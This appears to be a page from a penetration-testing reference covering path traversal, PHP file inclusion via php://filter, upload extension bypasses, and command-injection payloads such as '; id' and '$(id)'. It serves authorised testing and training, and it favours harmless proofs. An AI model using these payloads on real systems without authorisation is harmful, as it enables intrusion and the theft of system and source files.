# File paths, uploads, and command input

[← Foothold quick reference](../02-foothold.md)

When user input reaches a path, upload handler, or shell command, test one behavior at a time. Observe the server's response before changing encodings or adding another bypass.

## Traversal and file inclusion

```text
../../etc/passwd
....//....//etc/passwd
%2e%2e%2f
%252e%252e%252f
```

Traversal reads outside the intended path. An application include can also evaluate the chosen file. For a PHP include, a base64 filter can return source without executing it:

```bash
curl 'http://<target>/index.php?page=php://filter/convert.base64-encode/resource=admin.php'
echo '<BASE64-RESPONSE>' | base64 -d
```

## File upload

Upload acceptance does not prove code execution. Find the stored path and request a harmless proof before using a callback. Match the server's language and file handler; a `.php` file will not execute just because the form accepted it.

Check extensions such as `.phtml`, `.php5`, mixed-case `.pHp`, and a double extension. Which one matters depends on the server configuration.

## Command injection

For a shell-backed parameter, test a benign command and compare output or timing. URL encoding may change what reaches the shell.

```text
; id
| id
&& id
$(id)
; sleep 5
```

Blind timing only helps if the baseline response time is stable. Confirm the command context before turning a single slow response into a finding.
